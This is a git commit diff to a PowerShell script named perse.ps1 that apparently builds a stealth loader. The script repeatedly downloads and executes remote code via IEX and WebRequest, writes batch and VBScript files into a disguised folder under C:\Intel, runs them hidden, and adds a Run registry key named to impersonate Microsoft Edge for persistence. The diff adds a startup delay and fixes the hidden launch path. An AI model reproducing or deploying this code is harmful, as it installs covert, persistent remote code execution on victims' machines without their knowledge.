664d3ddd3e8d124a208eb49f97ac447032aff3fa
alejq41 <93050806+alejq41@users.noreply.github.com>
2022-08-25 09:33:15 -0500

    Update perse.ps1

--- perse.ps1
+++ perse.ps1
@@ -4,7 +4,8 @@ powershell IEX([System.IO.StreamReader]::New([System.Net.WebRequest]::Create('ht
 timeout /t 30
 goto a
 "@; add-content "C:\Intel\Profiles/IE/IEX/perse.bat" $contenttoadd; $contentToAdd = @"
+WScript.Sleep 10000
 set objshell = createobject("wscript.shell")
-objshell.run "seruex.bat",vbhide
+objshell.run "C:\Intel\Profiles/IE/IEX\perse.bat",vbhide
 "@; add-content "C:\Intel\Profiles/IE/IEX/perse.vbs" $contenttoadd; REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Microsoft_Edge_Company /d C:\Intel\Profiles/IE/IEX/perse.vbs; cd C:\Intel\Profiles/IE/IEX; ./perse.vbs
 exit
